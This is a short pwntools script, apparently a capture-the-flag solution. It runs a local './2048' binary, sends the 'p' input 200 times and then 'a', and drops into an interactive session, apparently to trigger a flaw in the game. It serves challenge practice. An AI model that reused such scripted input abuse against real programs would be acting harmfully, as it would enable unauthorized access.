from pwn import *

p = process("./2048")

for i in range(0, 200):
    p.sendline("p")
p.recv()
p.sendline("a")
p.interactive()

